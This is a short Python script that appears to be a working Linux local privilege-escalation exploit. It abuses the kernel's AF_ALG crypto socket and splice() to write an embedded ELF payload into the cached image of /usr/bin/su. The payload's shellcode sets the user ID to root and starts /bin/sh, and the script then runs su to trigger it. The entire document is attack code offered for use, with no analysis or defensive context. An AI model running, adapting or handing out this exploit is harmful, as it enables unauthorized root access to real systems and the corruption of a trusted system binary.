#!/usr/bin/env python3
import os
import zlib
import socket
import time

def spray_chunk(su_fd, offset, chunk):
    alg_sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
    alg_sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    SOL_ALG = 279

    key = bytes.fromhex('0800010000000010' + '00' * 32)
    alg_sock.setsockopt(SOL_ALG, 1, key)
    alg_sock.setsockopt(SOL_ALG, 5, None, 4)

    op_sock, _ = alg_sock.accept()
    data_size = offset + 4
    null_byte = bytes.fromhex('00')

    op_sock.sendmsg(
        [b"A" * 4 + chunk],
        [
            (SOL_ALG, 3, null_byte * 4),
            (SOL_ALG, 2, b'\x10' + null_byte * 19),
            (SOL_ALG, 4, b'\x08' + null_byte * 3),
        ],
        socket.MSG_MORE
    )

    os.lseek(su_fd, 0, os.SEEK_SET)
    pipe_read, pipe_write = os.pipe()
    os.splice(su_fd, pipe_write, data_size, offset_src=0)
    os.splice(pipe_read, op_sock.fileno(), data_size)
    os.close(pipe_read)
    os.close(pipe_write)

    try:
        op_sock.recv(4096, socket.MSG_DONTWAIT)
    except Exception:
        pass

    if offset % 32 != 0:
        op_sock.close()
        alg_sock.close()
    else:
        time.sleep(0.0001)


su_fd = os.open("/usr/bin/su", os.O_RDONLY)
offset = 0
payload = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x00\x00x\x00@\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x008\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x001\xc01\xff\xb0i\x0f\x05H\x8d=\x0f\x00\x00\x001\xf6j;X\x99\x0f\x051\xffj<X\x0f\x05/bin/sh\x00\x00\x00'

print("[*] Splaying kernel memory...")

while offset < len(payload):
    chunk = payload[offset:offset + 4]
    spray_chunk(su_fd, offset, chunk)
    offset += 4

print("[+] Splay finished.")
print("[*] Trying to trigger su...")
os.system("su")